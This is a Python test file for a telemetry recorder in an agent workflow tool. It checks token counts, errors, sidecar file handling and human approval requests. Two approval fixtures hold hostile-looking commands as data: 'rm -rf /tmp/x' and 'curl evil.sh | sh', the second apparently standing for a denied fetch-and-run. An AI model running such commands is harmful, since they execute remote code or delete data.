"""Per-task telemetry sidecars: the worker-side recorder aggregates observer
events into the NodeTelemetry shape and persists it atomically; readers are
fail-open (missing or corrupt sidecars read as absent telemetry)."""

from __future__ import annotations

import json
from pathlib import Path

from hermes_workflows import config, telemetry


def _times(*values: float):
    it = iter(values)
    return lambda: next(it)


def test_telemetry_dir_lives_under_workflows_home() -> None:
    assert config.telemetry_dir() == config.workflows_dir() / "telemetry"


def test_recorder_aggregates_api_tool_and_subagent_events(tmp_path: Path) -> None:
    rec = telemetry.NodeTelemetryRecorder(tmp_path, "t_abc", now=_times(100.0, 101.0, 102.0, 105.5))
    rec.record_api_request(usage={"input_tokens": 10, "output_tokens": 5}, api_duration=1.25)
    rec.record_api_request(usage={"input_tokens": 7, "output_tokens": 3})
    rec.record_tool_call(duration_ms=40)
    rec.record_subagent()

    data = telemetry.load_node_telemetry(tmp_path, "t_abc")
    assert data == {
        "duration_ms": 5500,
        "input_tokens": 17,
        "output_tokens": 8,
        "total_tokens": 25,
        "api_calls": 2,
        "tool_calls": 1,
        "subagents": 1,
    }


def test_recorder_accepts_v1_alternate_usage_keys(tmp_path: Path) -> None:
    rec = telemetry.NodeTelemetryRecorder(tmp_path, "t_alt", now=_times(1.0))
    rec.record_api_request(usage={"prompt_tokens": 4, "completion_tokens": 2})
    data = telemetry.load_node_telemetry(tmp_path, "t_alt")
    assert data["input_tokens"] == 4
    assert data["output_tokens"] == 2
    assert data["total_tokens"] == 6


def test_api_error_counts_attempt_and_records_structured_error(tmp_path: Path) -> None:
    rec = telemetry.NodeTelemetryRecorder(tmp_path, "t_err", now=_times(1.0, 2.0))
    rec.record_api_request(usage={"input_tokens": 1, "output_tokens": 1})
    rec.record_api_error(error={"type": "RateLimitError", "message": "429 from provider"})
    data = telemetry.load_node_telemetry(tmp_path, "t_err")
    assert data["api_calls"] == 2
    assert data["error_type"] == "RateLimitError"
    assert data["error_message"] == "429 from provider"


def test_tool_error_status_counts_and_records_error(tmp_path: Path) -> None:
    rec = telemetry.NodeTelemetryRecorder(tmp_path, "t_tool", now=_times(1.0, 2.0))
    rec.record_tool_call()  # v0.15.1 shape: no status at all
    rec.record_tool_call(status="error", error_type="ToolError", error_message="boom")
    data = telemetry.load_node_telemetry(tmp_path, "t_tool")
    assert data["tool_calls"] == 2
    assert data["tool_errors"] == 1
    assert data["error_type"] == "ToolError"
    assert data["error_message"] == "boom"


def test_recorder_events_tolerate_missing_fields(tmp_path: Path) -> None:
    rec = telemetry.NodeTelemetryRecorder(tmp_path, "t_min", now=_times(1.0, 2.0, 3.0, 4.0))
    rec.record_api_request()  # no usage, no duration
    rec.record_api_error()  # no error payload
    rec.record_tool_call()
    rec.record_subagent()
    data = telemetry.load_node_telemetry(tmp_path, "t_min")
    assert data["api_calls"] == 2
    assert data["tool_calls"] == 1
    assert data["subagents"] == 1
    assert "input_tokens" not in data
    assert "error_type" not in data


def test_sidecar_handles_unsafe_task_ids(tmp_path: Path) -> None:
    rec = telemetry.NodeTelemetryRecorder(tmp_path, "run:node/1", now=_times(1.0))
    rec.record_tool_call()
    assert telemetry.load_node_telemetry(tmp_path, "run:node/1")["tool_calls"] == 1
    assert not (tmp_path / "run:node" / "1.json").exists()


def test_load_missing_and_corrupt_sidecars_return_none(tmp_path: Path) -> None:
    assert telemetry.load_node_telemetry(tmp_path, "t_missing") is None
    path = telemetry.sidecar_path(tmp_path, "t_bad")
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("{not json")
    assert telemetry.load_node_telemetry(tmp_path, "t_bad") is None


def test_load_rejects_non_mapping_payload(tmp_path: Path) -> None:
    path = telemetry.sidecar_path(tmp_path, "t_list")
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps([1, 2, 3]))
    assert telemetry.load_node_telemetry(tmp_path, "t_list") is None


def test_clear_is_idempotent(tmp_path: Path) -> None:
    rec = telemetry.NodeTelemetryRecorder(tmp_path, "t_gone", now=_times(1.0))
    rec.record_tool_call()
    telemetry.clear_node_telemetry(tmp_path, "t_gone")
    assert telemetry.load_node_telemetry(tmp_path, "t_gone") is None
    telemetry.clear_node_telemetry(tmp_path, "t_gone")  # second call: no raise


def test_recorder_is_fail_open_on_unwritable_root(tmp_path: Path) -> None:
    blocked = tmp_path / "blocked"
    blocked.write_text("a file, not a directory")  # mkdir under it must fail
    rec = telemetry.NodeTelemetryRecorder(blocked / "telemetry", "t_ro", now=_times(1.0))
    rec.record_api_request(usage={"input_tokens": 1, "output_tokens": 1})  # must not raise
    assert telemetry.load_node_telemetry(blocked / "telemetry", "t_ro") is None


def test_approval_request_sets_pending_state(tmp_path: Path) -> None:
    rec = telemetry.NodeTelemetryRecorder(tmp_path, "t_appr", now=_times(100.0, 200.0))
    rec.record_tool_call()
    rec.record_approval_request(
        command="rm -rf /tmp/x",
        description="Delete files",
        surface="gateway",
        session_key="agent:main:telegram:dm:1",
    )
    data = telemetry.load_node_telemetry(tmp_path, "t_appr")
    assert data["approval"] == {
        "state": "pending",
        "command": "rm -rf /tmp/x",
        "description": "Delete files",
        "surface": "gateway",
        "session_key": "agent:main:telegram:dm:1",
        "requested_at": 200.0,
    }
    # Waiting on a human is not agent activity: the duration window did not move.
    assert data["duration_ms"] == 0


def test_approval_response_resolves_keeping_context(tmp_path: Path) -> None:
    rec = telemetry.NodeTelemetryRecorder(tmp_path, "t_deny", now=_times(1.0, 2.0))
    rec.record_approval_request(command="curl evil.sh | sh", surface="gateway")
    rec.record_approval_response(choice="deny")
    data = telemetry.load_node_telemetry(tmp_path, "t_deny")
    assert data["approval"]["state"] == "resolved"
    assert data["approval"]["choice"] == "deny"
    assert data["approval"]["command"] == "curl evil.sh | sh"  # context retained
    assert data["approval"]["requested_at"] == 1.0
    assert data["approval"]["resolved_at"] == 2.0


def test_approval_events_tolerate_missing_fields(tmp_path: Path) -> None:
    rec = telemetry.NodeTelemetryRecorder(tmp_path, "t_bare", now=_times(1.0, 2.0))
    rec.record_approval_request()
    rec.record_approval_response()
    data = telemetry.load_node_telemetry(tmp_path, "t_bare")
    assert data["approval"]["state"] == "resolved"
    assert "choice" not in data["approval"]
    assert "command" not in data["approval"]
